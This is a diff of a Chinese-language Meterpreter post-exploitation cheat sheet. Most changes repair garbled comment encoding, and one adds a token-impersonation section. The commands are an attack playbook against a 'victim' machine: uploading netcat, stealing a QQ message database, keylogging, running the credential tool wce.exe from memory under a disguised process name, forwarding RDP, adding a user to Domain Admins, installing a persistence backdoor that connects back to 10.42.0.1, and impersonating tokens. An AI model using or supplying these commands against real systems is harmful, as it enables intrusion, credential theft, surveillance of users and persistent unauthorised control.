@@ -35,146 +35,147 @@
 
 |webcam_stream
 
+|
 
 ________________________________________system oprerate command_____________________________________________________
 
-cat c:\boot.ini#�鿴�ļ�����,�ļ��������
+cat c:\boot.ini#查看文件内容,文件必须存在
 
-del c:\boot.ini #ɾ��ָ�����ļ�
+del c:\boot.ini #删除指定的文件
 
-upload /root/Desktop/netcat.exe c:\ # �ϴ��ļ���Ŀ�������
+upload /root/Desktop/netcat.exe c:\ # 上传文件到目标机主上
 
-��upload  setup.exe C:\\windows\\system32\download nimeia.txt /root/Desktop/   
+如upload  setup.exe C:\\windows\\system32\download nimeia.txt /root/Desktop/   
 
-# �����ļ����������磺
+# 下载文件到本机上如：
 
 download C:\\boot.ini /root/
 
-����
+或者
 
 download C:\\"ProgramFiles"\\Tencent\\QQ\\Users\\295******125\\Msg2.0.db /root/
 
-edit c:\boot.ini  # �༭�ļ�
+edit c:\boot.ini  # 编辑文件
 
-getlwd#��ӡ����Ŀ¼
+getlwd#打印本地目录
 
-getwd#��ӡ����Ŀ¼
+getwd#打印工作目录
 
-lcd#���ı���Ŀ¼
+lcd#更改本地目录
 
-ls#�г��ڵ�ǰĿ¼�е��ļ��б�
+ls#列出在当前目录中的文件列表
 
-lpwd#��ӡ����Ŀ¼
+lpwd#打印本地目录
 
-pwd#�������Ŀ¼
+pwd#输出工作目录
 
-cd c:\\ #����Ŀ¼�ļ���
+cd c:\\ #进入目录文件下
 
-rm file #ɾ���ļ�
+rm file #删除文件
 
-mkdir dier #���ܺ���ϵͳ�ϵĴ���Ŀ¼
+mkdir dier #在受害者系统上的创建目录
 
-rmdir#�ܺ���ϵͳ��ɾ��Ŀ¼
+rmdir#受害者系统上删除目录
 
-dir#�г�Ŀ���������ļ����ļ�����Ϣ
+dir#列出目标主机的文件和文件夹信息
 
-mv#�޸�Ŀ�������ϵ��ļ���
+mv#修改目标主机上的文件名
 
-search -d d:\\www -f web.config #search �ļ�����search  -d c:\\  -f*.doc
+search -d d:\\www -f web.config #search 文件，如search  -d c:\\  -f*.doc
 
-meterpreter > search -f autoexec.bat  #�����ļ�
+meterpreter > search -f autoexec.bat  #搜索文件
 
 meterpreter > search -f sea*.bat c:\\xamp\\
 
-enumdesktops     #�û���¼��
+enumdesktops     #用户登录数
 
-keyscan_start���������̼�¼����
+keyscan_start：开启键盘记录功能
 
-keyscan_dump����ʾ��׽���ļ��̼�¼��Ϣ
+keyscan_dump：显示捕捉到的键盘记录信息
 
-keyscan_stop��ֹͣ���̼�¼����
+keyscan_stop：停止键盘记录功能
 
 [+][+][+][+][+]execute
 
 execute -H -f notepad.exe
 
-��������Ŀ�������ϵ�cmd.exe���򣬲������صķ�ʽֱ�ӽ��������ǵ�meterpreter�Ự��
+我们运行目标主机上的cmd.exe程序，并以隐藏的方式直接交互到我们的meterpreter会话上
 
-���
+命令：
 
 execute  -H -i -f cmd.exe
 
-��Ŀ�������ڴ���ֱ��ִ�����ǹ��������ϵĹ������򣬱���wce.exe���ֱ���ľ���ȣ��������Ա��⹥������洢��Ŀ������Ӳ���ϱ����ֻ򱻲�ɱ��
+在目标主机内存中直接执行我们攻击主机上的攻击程序，比如wce.exe，又比如木马等，这样可以避免攻击程序存储到目标主机硬盘上被发现或被查杀。
 
 execute  -H -m -d notepad.exe -f  wce.exe -a "-o wce.txt"
 
--d ��Ŀ������ִ��ʱ��ʾ�Ľ������ƣ�����αװ��
+-d 在目标主机执行时显示的进程名称（用以伪装）
 
--m ֱ�Ӵ��ڴ���ִ��
+-m 直接从内存中执行
 
--o wce.txt"��wce.exe�����в���
+-o wce.txt"是wce.exe的运行参数
 
 [+][+][+][+]portfwd
 
 portfwd -h
 
-�÷���portfwd [-h] [add | delete | list | flush] [args]
+用法：portfwd [-h] [add | delete | list | flush] [args]
 
  
 
-ѡ�
+选项：
 
-    -L <opt>Ҫ�����ı�����������ѡ��
+    -L <opt>要监听的本地主机（可选）
 
-    -h�������
+    -h帮助横幅
 
-    -l <opt>Ҫ�����ı��ض˿�
+    -l <opt>要监听的本地端口
 
-    -p <opt>���ӵ���Զ�̶˿�
+    -p <opt>连接到的远程端口
 
-    -r <opt>Ҫ���ӵ���Զ������
+    -r <opt>要连接到的远程主机
 
-portfwd  add -l 4444 -p 3389 -r 192.168.1.102 # �˿�ת��,��������4444,��Ŀ���3389ת������4444
+portfwd  add -l 4444 -p 3389 -r 192.168.1.102 # 端口转发,本机监听4444,把目标机3389转到本机4444
 
-netstat -an | grep��4444"  #�鿴ָ���˿ڿ������
+netstat -an | grep“4444"  #查看指定端口开放情况
 
-rdesktop -u Administrator -p bk#123 127.0.0.1:4444 #ʹ��rdesktop���������棬-u �û��� -p ����
+rdesktop -u Administrator -p bk#123 127.0.0.1:4444 #使用rdesktop来连接桌面，-u 用户名 -p 密码
 
-rdesktop 127.1.1.0:4444 #��Ҫ�����û���������Զ������
+rdesktop 127.1.1.0:4444 #需要输入用户名和密码远程连接
 
-route#�鿴���޸��ܺ���·�ɱ�
+route#查看或修改受害者路由表
 
-route add 192.168.1.0 255.255.255.0 1 #���Ӷ�̬·��
+route add 192.168.1.0 255.255.255.0 1 #添加动态路由
 
-route print #·�ɱ����
+route print #路由表输出
 
-runget_local_subnets #Ŀ������������IP�����
+runget_local_subnets #目标主机的内网IP段情况
 
-Arp       #��ARP�����
+Arp       #看ARP缓冲表
 
-Getproxy     #��ȡ����
+Getproxy     #获取代理
 
 [+]systemcommand
 
-ϵͳ����
+系统命令
 
-reboot#���������ܺ��˵ļ����
+reboot#重新启动受害人的计算机
 
-reg#���ܺ��˵�ע������н���
+reg#与受害人的注册表进行交互
 
-rev2self#�ص�����Ŀ�������ĳ�ʼ�û��˻���
+rev2self#回到控制目标主机的初始用户账户下
 
-shell#��ÿ���̨Ȩ��
+shell#获得控制台权限
 
-shutdown#�ر����ܺ��ߵļ����
+shutdown#关闭了受害者的计算机
 
-sysinfo # �鿴Ŀ���ϵͳ��Ϣ���������������ϵͳ��
+sysinfo # 查看目标机系统信息，如机器名，操作系统等
 
-add_user username password -h ip    #��Զ��Ŀ������������һ���û�
+add_user username password -h ip    #在远程目标主机上添加一个用户
 
-add_group_user "Domain Admins" username -h ip    #���û����ӵ�Ŀ�������������Ա����
+add_group_user "Domain Admins" username -h ip    #将用户添加到目标主机的域管理员组中
 
-shell����
+shell命令
 
 [+]backdoor
 
@@ -184,11 +185,20 @@ msf exploit(handler) > use exploit/multi/handler
 
 msf exploit(handler) > set payload windows/metsvc_bind_tcp
 
-persistenceģ�����
+persistence模块后门
 
-һ��vbs����д���˿�������������ױ����ֻ�����Ҫ��ҷ����Լ����ǻ�:)
+一个vbs后门写入了开机启动项但是容易被发现还是需要大家发挥自己的智慧:)
 
 meterpreter > run persistence -X -i 5 -p 23333 -r 10.42.0.1
+
+[+]假冒令牌
+
+use incognito
+
+list_tokens -u  //列出所有可用token
+
+imperson_token TOKENS\\Adminstrater
+
 
 
 
